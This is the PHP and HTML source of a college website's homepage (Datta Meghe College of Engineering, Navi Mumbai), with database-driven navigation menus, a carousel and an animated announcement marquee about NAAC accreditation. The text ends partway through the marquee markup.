<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Datta Meghe College of Engineering, Airoli, Navi Mumbai</title>
    <meta name="description" content="Established in 1988 at Airoli, Navi Mumbai, Datta Meghe College of Engineering touched many innumerable milestones with unlimited credentials and accomplishments. The institute is NAAC accredited, approved by AICTE New Delhi, and recognized by DTE & Govt. of Maharashtra.">
    <meta name="keywords" content="Datta Meghe College of Engineering, Airoli Navi Mumbai, DMCE, Engineering College, NAAC Accredited, AICTE Approved, Maharashtra College, Technical Education">
    <meta name="author" content="Datta Meghe College of Engineering">
    <meta name="robots" content="index, follow">
    <meta name="og:title" content="Datta Meghe College of Engineering, Airoli, Navi Mumbai">
    <meta name="og:description" content="Established in 1988 at Airoli, Navi Mumbai, Datta Meghe College of Engineering touched many innumerable milestones with unlimited credentials and accomplishments. The institute is NAAC accredited, approved by AICTE New Delhi, and recognized by DTE & Govt. of Maharashtra.">
    <meta name="og:image" content="https://dmce.ac.in/assets/img/dmce.png">
    <meta name="og:url" content="https://dmce.ac.in/"> 
    <meta name="og:type" content="website">
    <meta name="og:site_name" content="Datta Meghe College of Engineering">
    <meta name="twitter:title" content="Datta Meghe College of Engineering, Airoli, Navi Mumbai">
    <meta name="twitter:description" content="Established in 1988 at Airoli, Navi Mumbai, Datta Meghe College of Engineering touched many innumerable milestones with unlimited credentials and accomplishments. The institute is NAAC accredited, approved by AICTE New Delhi, and recognized by DTE & Govt. of Maharashtra.">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
    <link rel="stylesheet" href="./assets/style.css?v=123674">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,100..1000&display=swap" rel="stylesheet">
    <link href="./assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet" />
	<script src="
	https://cdn.jsdelivr.net/npm/@splidejs/splide@4.1.4/dist/js/splide.min.js
	"></script>
	<link href="
	https://cdn.jsdelivr.net/npm/@splidejs/splide@4.1.4/dist/css/splide.min.css
	" rel="stylesheet">

    <style>
	
/* Marquee styles */
.marquee {
  --gap: 1rem;
  position: relative;
  display: flex;
  overflow: hidden;
  user-select: none;
  gap: var(--gap);
}

.marquee__content {
  flex-shrink: 0;
  display: flex;
  justify-content: space-around;
  gap: var(--gap);
  min-width: 100%;
}

@keyframes scroll {
  from {
    transform: translateX(0);
  }
  to {
    transform: translateX(calc(-100% - var(--gap)));
  }
}

/* Pause animation when reduced-motion is set */
@media (prefers-reduced-motion: reduce) {
  .marquee__content {
    animation-play-state: paused !important;
  }
}

/* Enable animation */
.enable-animation .marquee__content {
  animation: scroll 30s linear infinite;
}

/* Reverse animation */
.marquee--reverse .marquee__content {
  animation-direction: reverse;
}

/* Pause on hover */
.marquee--hover-pause:hover .marquee__content {
  animation-play-state: paused;
}

/* Attempt to size parent based on content. Keep in mind that the parent width is equal to both content containers that stretch to fill the parent. */
.marquee--fit-content {
  max-width: fit-content;
}

/* A fit-content sizing fix: Absolute position the duplicate container. This will set the size of the parent wrapper to a single child container. Shout out to Olavi's article that had this solution ?? @link: https://olavihaapala.fi/2021/02/23/modern-marquee.html  */
.marquee--pos-absolute .marquee__content:last-child {
  position: absolute;
  top: 0;
  left: 0;
}

/* Enable position absolute animation on the duplicate content (last-child) */
.enable-animation .marquee--pos-absolute .marquee__content:last-child {
  animation-name: scroll-abs;
}

@keyframes scroll-abs {
  from {
    transform: translateX(calc(100% + var(--gap)));
  }
  to {
    transform: translateX(0);
  }
}

/* Other page demo styles */
.marquee__content > * {
  color: white;
  font-size: 16px;
  margin: 2px;
  padding: 0.2rem 2rem;
  text-align: center;
  font-weight: 300;
}

.marquee {
  background-color:var(--blue);
}

ul.marquee__content{
  margin-bottom: 0px;
  background-color: var(--blue);
}

.marqueesection > * + * {
  margin-block-start: 0.5rem;
}
.marquee__content{
  list-style: none;
}
.marquee__content>li>svg{
  color: var(--yellow);
}

:root {  
  --purple: #ffc100;
  --violet: #ff7400;
  --pink: #ff0000;
}

@keyframes background-pan {
  from {
    background-position: 0% center;
  }
  
  to {
    background-position: -200% center;
  }
}

@keyframes scale {
  from, to {
    transform: scale(0);
  }
  
  50% {
    transform: scale(1);
  }
}

@keyframes rotate {
  from {
    transform: rotate(0deg);
  }
  
  to {
    transform: rotate(180deg);
  }
}


.starher > .magic {
  display: inline-block;
  position: relative;
}

.starher > .magic > .magic-star {
  --size: clamp(8px, 1.5vw, 12px);
  
  animation: scale 700ms ease forwards;
  display: block;
  height: var(--size);
  left: var(--star-left);
  position: absolute;
  top: var(--star-top);
  width: var(--size);
}

.starher > .magic > .magic-star > svg {
  animation: rotate 1000ms linear infinite;
  display: block;
  opacity: 0.7;
}

.starher > .magic > .magic-star > svg > path {
  fill: var(--violet);
}

.starher > .magic > .magic-text {
  animation: background-pan 3s linear infinite;
  background: linear-gradient(
    to right,
    var(--purple),
    var(--violet),
    var(--pink),
    var(--purple)
  );
  background-size: 200%;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  white-space: nowrap;
  font-weight: 600;
}


.computerspreadnav{
  background: #1C1D36!important;
  padding: 0.5rem;
  padding-top: 0px;
}
.computerspreadnavcontainer{
  padding-top: 0.5rem;
  display: flex;
  flex-direction: row;
  justify-content: space-between;
  align-items: center;
}
.computerspreadnavdropdown{
  transform: translate3d(27px, 4px, 0px)!important;
}
@media screen and (max-width:992px) {
  .computerspreadnav{
    display: none;
  } 
}
@media screen and (min-width:992px){
  .morelinknavitem{
	display:none;	
  }

}




.threepanes{
  display: flex;
  gap: 40px;
  align-items: stretch;
  justify-content: center;
}
.threepanes>div{
  flex: 1;
  border-radius: 5px;
  overflow: hidden;
}
.threepaneshead{
  padding: 10px 15px;
  background-color: var(--blue);
  text-align: center;
  font-size: 24px!important;
}
.threepanesbody{
  border: 2px solid #d9d9d9;
  border-top: 0px;
  border-right: 0px;
  padding: 10px 15px 10px 30px;
  background-color: white;

}
.threepanesbody .threepaneslink{
  display: block;
  color: var(--pgrey);
  font-size: 20px;
  padding-bottom: 10px!important;
  
}
.threepanesbody .threepaneslink:hover{
  color: var(--yellow);
  cursor: pointer;
}

.threepanesbody{
  height: 400px;
  overflow-y: scroll;
}

@media screen and (max-width:998px) {
  .threepanes{
    flex-direction: column;
    padding-left: 12px;
    padding-right: 12px;
  }
}

.swiper-container-free-mode > .swiper-wrapper{
  transition-timing-function : linear!important;
}
#nav-tab{
	gap:0px,
}
.tab-pane{
	padding:20px;
	border-bottom:1px solid #D1D1D1;
	border-left:1px solid #D1D1D1;
	border-right:1px solid #D1D1D1;
}
@media screen and (max-width:992px){
	.nav.nav-tabs{
		flex-direction:column!important;
	}
	.splide__slide{
		aspect-ratio:2!important;
	}
}

.swiper-horizontal>.swiper-pagination-bullets, .swiper-pagination-bullets.swiper-pagination-horizontal, .swiper-pagination-custom, .swiper-pagination-fraction{
	bottom:25px;
}
@media screen and (max-width:450px){
	.ach-details h1{
		font-size:16px!important;
	}
	.ach-details p{
		font-size:12px!important;
	}
}
.beyondlinks a{
	font-size:16px!important;
}
.computerspreadnavcontainer1 .dropdown-menu{
	translate:-10px 10px !important;	
}
#abtdrp .dropdown-menu{
	translate:-31px 34px !important;
}

    </style>

</head>
<?php include("./connect.php");
$admissions = "select id, admission_name from admissions";
$adm_res = pg_query($conn, $admissions);

$depts = "select id, name from departments";
$depts_res = pg_query($conn, $depts);
?>

<body data-bs-theme="light">

    <?php
    $admissions = "select id, admission_name from admissions order by id";
    $adm_res = pg_query($conn, $admissions);
    $adm_res1 = pg_query($conn, $admissions);
    $depts = "select id, name from departments";
    $depts_res = pg_query($conn, $depts);
    $depts1 = "select id, name from departments";
    $depts_res1 = pg_query($conn, $depts1);
    $depts2 = "select id, name from departments";
    $depts_res2 = pg_query($conn, $depts1);

    $gov = "select id, name from governance";
    $gov_res = pg_query($conn, $gov);

    $club = "select id, name from student_clubs";
    $club_res = pg_query($conn, $club);

    $nirf = "select id, year from nirf";
    $nirf_res = pg_query($conn, $nirf);

    ?>

    <nav class="navbar navbar-expand-lg herobar">
        <div class="container">
            <a class="navbar-brand" href="#">
                <div class="dmcelogocontainer">
                    <img class="dmcelogo" src="./assets/img/dmce.png" alt="">
                    <div class="dmcetext">
                        <p style="color:#8b92bb!important;font-size:18px">Nagar Yuwak Shikshan Sanstha, Airoli</p>
                        <h1>Datta Meghe College of Engineering</h1>
                    </div>
                </div>
            </a>
            <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-content">
                <div class="hamburger-toggle">
                    <div class="hamburger">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </div>
            </button>
            <div class="collapse navbar-collapse notinpc" id="navbar-content">
                <ul class="navbar-nav mr-auto mb-2 mb-lg-0" style="margin-left: auto;">
                    <li class="nav-item">
                        <a class="nav-link active" style="color: white!important;" aria-current="page" href="<?php echo $url; ?>/">Home</a>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white" href="#" role="button" data-bs-toggle="dropdown"  data-bs-auto-close="outside">
                            About
                        </a>
                        <ul class="dropdown-menu">
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/about/aboutdmce.php" style="color: #10185a">About DMCE</a></li>
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/about/amenities.php" style="color: #10185a">Amenities</a></li>
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/about/board.php" style="color: #10185a">Board</a></li>
			    <li><a class="dropdown-item" href="<?php echo $url; ?>/about/awards.php" style="color: #10185a">Institute Awards</a></li>

                            <li class="dropstart">
                                <a href="#" class="dropdown-item dropdown-toggle"  style="color: #10185a"  data-bs-toggle="dropdown">Mandatory Disclosure</a>
                                <ul class="dropdown-menu dropdown-submenu shadow">
                                     <li><a class="dropdown-item" href="<?php echo $url; ?>/about/disclosure.php" style="color: #10185a">Mandatory Disclosure</a></li>
                                     <li><a class="dropdown-item" href="<?php echo $url; ?>/about/staffpolicy.php" style="color: #10185a">Staff Policy</a></li>
                                     <li><a class="dropdown-item" href="<?php echo $url; ?>/about/audit.php" style="color: #10185a">Audit Report</a></li>
                                </ul> 
                            </li> 
                        </ul>
                    </li>
<li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Admissions
                        </a>
                        <ul class="dropdown-menu" style="translate:0 60px;">
                            <?php while ($r = pg_fetch_assoc($adm_res1)) { ?>
                                <li><a style="color: #10185a" class="dropdown-item" href="<?php echo $url; ?>/admissions/admission.php<?php echo encrypt($r["id"]); ?>"><?php echo $r["admission_name"]; ?></a></li>
                            <?php } ?>
                        </ul>
                    </li>

		<li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding-right:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Departments
                        </a>
                        <ul class="dropdown-menu">
                        <?php while ($r = pg_fetch_assoc($depts_res2)) { ?>
                          <li class="dropend">
                          <a href="<?php echo $url; ?>/departments/branch2.php<?php echo encrypt($r["id"]); ?>" class="dropdown-item"><?php echo $r["name"]; ?></a>
                      <?php } ?>
			

                        </ul>
        	 </li>

                     <div class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding-right:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Placements
                        </a>
                        <ul class="dropdown-menu"><li><a class="dropdown-item" href="<?php echo $url; ?>/placements/about.php" style="color: #10185a">Placements</a></li>
<!--                            <li><a class="dropdown-item" href="#" style="color: #10185a">Internships</a></li> -->
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/placements/mou.php" style="color: #10185a">MOUs & Partnerships</a></li>
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/placements/faculty.php" style="color: #10185a">Faculty</a></li>
                        </ul>
                    </div>
			<li class="nav-item dropdown">
                                <a href="#" class="nav-link dropdown-toggle" style="color: #fff" data-bs-toggle="dropdown">Examinations</a>
                                <ul class="dropdown-menu shadow">
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/exams/document.php" style="color: #10185a">Document Verification</a></li>
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/exams/transcript.php" style="color: #10185a">Transcript</a></li>

                                </ul>
                            </li>
                    <li class="nav-item dropdown">
                                <a class="nav-link dropdown-toggle" style="color: white;padding-right:0px!important;" data-bs-toggle="dropdown">Approvals</a>
                                <ul class="dropdown-menu shadow">
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/approvals/aicte.php" style="color: #10185a">AICTE</a></li>
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/approvals/university.php" style="color: #10185a">University Affiliation</a></li>

                                </ul>
                            </li>
	              <li class="nav-item dropdown">
                                <a class="nav-link dropdown-toggle" style="color: white;padding-right:0px!important;" data-bs-toggle="dropdown">Academics</a>
                                <ul class="dropdown-menu shadow">
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/academics/co&po.php" style="color: #10185a">CO's and PO's</a></li>
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/academics/teacher.php" style="color: #10185a">Teaching Learning Process</a></li>
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/academics/student.php" style="color: #10185a">Student Satisfaction Reports</a></li>
                                </ul>

                     </li>
			<li><a class="nav-link" style="color: #fff" href="<?php echo $url; ?>/research/books.php" >Research</a></li>
			<li><a class="nav-link" style="color: #fff" href="/grievance/">Grievances</a></li>
			<li><a class="nav-link" style="color: #fff" href="https://dmce.ac.in/alumni/dashboard.html">Alumni</a></li>
                            <li><a class="nav-link" style="color: #fff" href="./NAAC/">NAAC</a></li>
				<li><a class="nav-link" style="color: #fff" href="<?php echo $url?>/nirf/nirf.php">NIRF</a></li>
			<li><a class="nav-link" style="color: #fff" href="https://dmce.irins.org/">IRINS</a></li>
				<li><a class="nav-link" style="color: #fff" href="https://sites.google.com/site/dmcecentrallibrary/">Library</a></li>
<li><a class="nav-link" style="color: #fff" href="http://services.dmce.ac.in">ERP Login</a></li>
                                        <li class="nav-item dropdown morelinknavitem">

                        <a class="nav-link dropdown-toggle morelink" href="#" style="color: #10185a!important;padding-right:0px!important;" data-bs-toggle="dropdown" data-bs-auto-close="outside">
                            <p style="color:white;">More</p><img src="./assets/img/hamburger.png" style="height:18px;" alt="">
                        </a>
                        <ul class="dropdown-menu shadow">
                            <li class="dropstart">
                                <a href="#" class="dropdown-item dropdown-toggle" style="color: #10185a" data-bs-toggle="dropdown">Governance</a>
                                <ul class="dropdown-menu shadow">
                                    <?php while ($r = pg_fetch_assoc($gov_res)) { ?>
                                        <li><a style="color: #10185a" class="dropdown-item" href="<?php echo $url; ?>/governance/cell.php<?php echo encrypt($r["id"]); ?>"><?php echo $r["name"]; ?></a></li>
                                    <?php } ?>

                                </ul>
                            </li>                            
                            
                            <li class="dropstart">
                                <a href="#" class="dropdown-item dropdown-toggle" style="color: #10185a" data-bs-toggle="dropdown">Entrepreneurship</a>
                                <ul class="dropdown-menu shadow">
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/entrepreneurship/entrepreneurship.php" style="color: #10185a">About</a></li>
                                    <li><a class="dropdown-item" href="<?php echo $url; ?>/entrepreneurship/ecell.php" style="color: #10185a">E Cell</a></li>
                                </ul>
                            </li>
                                          <li class="dropstart">
                  <a href="#" class="dropdown-item dropdown-toggle" style="color: #10185a"  data-bs-toggle="dropdown" data-bs-auto-close="outside">Student Clubs</a>
                  <ul class="dropdown-menu dropdown-submenu shadow">
                      <?php while ($r = pg_fetch_assoc($club_res)) { ?>
                          <li class="dropend">
                          <a href="#" class="dropdown-item dropdown-toggle" data-bs-toggle="dropdown"><?php echo $r["name"]; ?></a>
                          <ul class="dropdown-menu dropdown-submenu shadow">
                              <li><a class="dropdown-item" href="<?php echo $url; ?>/studentclubs/clubs.php<?php echo encrypt($r["id"]); ?>">About</a></li>
                              <li><a class="dropdown-item" href="<?php echo $url; ?>/studentclubs/members.php<?php echo encrypt($r["id"]); ?>">Members</a></li>

				<li><a class="dropdown-item" href="<?php echo $url; ?>/studentclubs/newsletter.php<?php echo encrypt($r["id"]); ?>">News</a></li>
                          </ul>
                      </li>
                      <?php } ?>
                  </ul>
              </li>                            
		
</ul>
                    </li>

                </ul>

            </div>
        </div>
    </nav>

  <section class="computerspreadnav" style="border-top:1px solid #2a2b51!important;">
    <div class="container">
        <div class="computerspreadnavcontainer computerspreadnavcontainer1">
        <div class="dropdown">
                        <a class="nav-link active" href="/" style="font-weight:300;color: white!important;padding:0px!important;" type="button">
                Home
            </a>
        </div>
        <div class="dropdown" id="abtdrp">
            <a class="nav-link active dropdown-toggle"  style="font-weight:300;color: white!important;padding:0px!important;"  type="button" data-bs-toggle="dropdown" aria-expanded="false">
                About
            </a>
            <ul class="dropdown-menu computerspreadnavdropdown shadow">
                <li><a class="dropdown-item" href="<?php echo $url; ?>/about/aboutdmce.php" style="color: #10185a">About DMCE</a></li>
                <li><a class="dropdown-item" href="<?php echo $url; ?>/about/amenities.php" style="color: #10185a">Amenities</a></li>
		<li><a class="dropdown-item" href="<?php echo $url; ?>/about/board.php" style="color: #10185a">Board</a></li>
		<li><a class="dropdown-item" href="<?php echo $url; ?>/about/awards.php" style="color: #10185a">Institute Awards</a></li>
		<li><a class="dropdown-item" href="<?php echo $url; ?>/about/disclosure.php" style="color: #10185a">Mandatory Disclosure</a></li>
		<li><a class="dropdown-item" href="<?php echo $url; ?>/about/staffpolicy.php" style="color: #10185a">Staff Policy</a></li>
		<li><a class="dropdown-item" href="<?php echo $url; ?>/about/audit.php" style="color: #10185a">Audit Report</a></li>
            </ul>
        </div>
        <div class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Admissions
                        </a>
                        <ul class="dropdown-menu" style="translate:0 60px;">
                            <?php while ($r = pg_fetch_assoc($adm_res)) { ?>
                                <li><a style="color: #10185a" class="dropdown-item" href="<?php echo $url; ?>/admissions/admission.php<?php echo encrypt($r["id"]); ?>"><?php echo $r["admission_name"]; ?></a></li>
                            <?php } ?>
                        </ul>
                    </div>
         <div class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Departments
                        </a>
                        <ul class="dropdown-menu">
                        <?php while ($r = pg_fetch_assoc($depts_res)) { ?>
                          <li class="dropend">
                          <a href="<?php echo $url; ?>/departments/branch2.php<?php echo encrypt($r["id"]); ?>" class="dropdown-item"><?php echo $r["name"]; ?></a>
                      <?php } ?></ul>
         </div><div class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                            Placements
                        </a>
                        <ul class="dropdown-menu">
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/placements/about.php" style="color: #10185a">Placements</a></li>
<!--                            <li><a class="dropdown-item" href="#" style="color: #10185a">Internships</a></li> -->
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/placements/mou.php" style="color: #10185a">MOUs & Partnerships</a></li>
                            <li><a class="dropdown-item" href="<?php echo $url; ?>/placements/faculty.php" style="color: #10185a">Faculty</a></li>

                        </ul>
                    </div>
<?php 
    $gov = "select id, name from governance";
    $gov_res = pg_query($conn, $gov);
?>
	<div class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" style="color: white;padding:0px!important;" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                          Governance
                        </a>
                        <ul class="dropdown-menu">
				<?php while ($r = pg_fetch_assoc($gov_res)) { ?>
					<li><a class="dropdown-item" href="<?php echo $url; ?>/governance/cell.php<?php echo encrypt($r["id"]); ?>" style="color: #10185a"><?php echo $r["name"]; ?></a></li>
				<?php } ?>
                        </ul>
                    </div>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="/grievance/">Grievances</a>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="https://dmce.ac.in/alumni/dashboard.html">Alumni</a>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="http://services.dmce.ac.in">ERP</a>
        </div>
        
    </div>
  </section>

<?php
    $carousel = "select * from carousel";
    $car_res = pg_query($conn, $carousel);
?>
	<section class="splide" aria-label="Basic Structure Example">
  <div class="splide__track">
    <ul class="splide__list">
    <?php while($r= pg_fetch_assoc($car_res)){ ?>
      <li class="splide__slide" style="background:url('<?php echo $adminurl.$r["file"]; ?>');background-size: cover;background-position: center;width: 100%;height: 100%;"></li>
      <?php } ?>

    </ul>
  </div>
	<script>
var splide = new Splide( '.splide',{type:"loop",autoplay:true} );
splide.mount();
</script>

    </section>


<section class="computerspreadnav" style="padding:0.4rem 2rem">
    <div class="container">
        <div class="computerspreadnavcontainer" style="padding:0;border:none;">
        <div class="dropdown">
            <a class="nav-link active dropdown-toggle" style="color: white!important;padding:0px!important;font-weight:300;" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                Approvals
            </a>
            <ul class="dropdown-menu computerspreadnavdropdown shadow">
                <li><a class="dropdown-item" href="/approvals/aicte.php">AICTE</a></li>
                <li><a class="dropdown-item" href="/approvals/university.php">University Affiliation</a></li>
            </ul>
        </div>
        <div class="dropdown">
            <a class="nav-link active dropdown-toggle" style="font-weight:300;color: white!important;padding:0px!important;" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                Academics
            </a>
            <ul class="dropdown-menu computerspreadnavdropdown shadow">
                <li><a class="dropdown-item" href="/academics/teacher.php" style="color: #10185a">Teaching Learning Process</a></li>
                <li><a class="dropdown-item" href="/academics/student.php" style="color: #10185a">Student Satisfaction Reports</a></li>
            </ul>
        </div>
        <div class="dropdown">
            <a class="nav-link active dropdown-toggle" style="font-weight:300;color: white!important;padding:0px!important;" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                Examinations
            </a>
            <ul class="dropdown-menu computerspreadnavdropdown shadow">
                <li><a class="dropdown-item" href="/exams/document.php" style="color: #10185a">Document Verification</a></li>
                <li><a class="dropdown-item" href="/exams/transcript.php" style="color: #10185a">Transcript</a></li>
            </ul>
        </div>
        <div class="dropdown">
            <a class="nav-link active dropdown-toggle" style="font-weight:300;color: white!important;padding:0px!important;" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                Entrepreneurship
            </a>
            <ul class="dropdown-menu computerspreadnavdropdown shadow">
            <li><a class="dropdown-item" href="/entrepreneurship/entrepreneurship.php" style="color: #10185a">About</a></li>
                  <li><a class="dropdown-item" href="/entrepreneurship/ecell.php" style="color: #10185a">E Cell</a></li>
                </ul>
        </div>
	<a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="https://dmce.ac.in/research/books.php">Research</a>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="https://sites.google.com/site/dmcecentrallibrary/">Library</a>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="/nirf/nirf.php">NIRF</a>
        <a class="nav-link active" style="font-weight:300;color: white!important;padding:0px!important;" aria-current="page" href="/NAAC/">NAAC</a>
        <a class="nav-link active" style="font-weight:300;color:white!important;padding:0px!important;" aria-current="page" href="https://dmce.irins.org/">IRINS</a>
        </div>
        
    </div>
  </section>

 <section class="marqueesection enable-animation" style="margin-bottom:40px">
    <div class="marquee marquee--hover-pause">
      <ul class="marquee__content">
      <li class="starher">
        <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
            <circle cx="8" cy="8" r="8" />
        </svg>
        We are delighted to announce that "Civil & Infrastructure Engineering branch" is now equivalent to "Civil Engineering Branch.
        <span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c011.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
        <li class="starher">
        <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="currentColor" class="bi bi-circle-fill" viewBox="0 0 16 16">
            <circle cx="8" cy="8" r="8" />
        </svg>
          We are elated to share that our Institute has been Accredited by
          <span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-text">NAAC</span>
          </span>
          (cycle 2) with
		<span class="magic">
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
                <path d="M512 255.1c0 11.34-7.406 20.86-18.44 23.64l-171.3 42.78l-42.78 171.1C276.7 504.6 267.2 512 255.9 512s-20.84-7.406-23.62-18.44l-42.66-171.2L18.47 279.6C7.406 276.8 0 267.3 0 255.1c0-11.34 7.406-20.83 18.44-23.61l171.2-42.78l42.78-171.1C235.2 7.406 244.7 0 256 0s20.84 7.406 23.62 18.44l42.78 171.2l171.2 42.78C504.6 235.2 512 244.6 512 255.1z" />
              </svg>
            </span>
            <span class="magic-star">
              <svg viewBox="0 0 512 512">
